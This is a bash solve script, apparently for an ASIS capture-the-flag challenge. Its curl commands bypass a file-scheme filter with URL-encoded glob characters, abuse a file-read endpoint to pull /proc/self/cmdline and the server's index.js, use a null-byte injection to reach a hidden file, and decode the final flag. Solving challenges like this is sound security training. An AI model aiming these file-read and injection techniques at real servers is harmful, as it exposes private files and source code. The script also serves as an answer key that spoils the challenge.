#!/bin/bash
curl http://45.147.231.180:8000
# inde.php
curl http://45.147.231.180:8000?x=fil%5Be-f%5D%3A%2F%2F%2Fn%5Be-f%5Dxt.txt
# wow... so next step is available at http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/
curl http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/
# did you know i can read files?? amazing right,,, maybe try /39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/proc/self/cmdline
curl http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/proc/self/cmdline | base64 -d
# /bin/bun-1.0.2/app/index.js
curl http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/app/index.js | base64 -d
# index.js
curl http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/next.txt%00/1 | base64 -d
# Now it's time for a whitebox challenge.
# Find the hidden subdomain and then a secret endpoint and only then you may receive your flag.
# Link to the website: `anVzdCBraWRkaW5nLiBBU0lTe2dvb2Rfam9iX2J1bn0gCg==`
echo 'anVzdCBraWRkaW5nLiBBU0lTe2dvb2Rfam9iX2J1bn0gCg==' | base64 -d
# just kidding. ASIS{good_job_bun}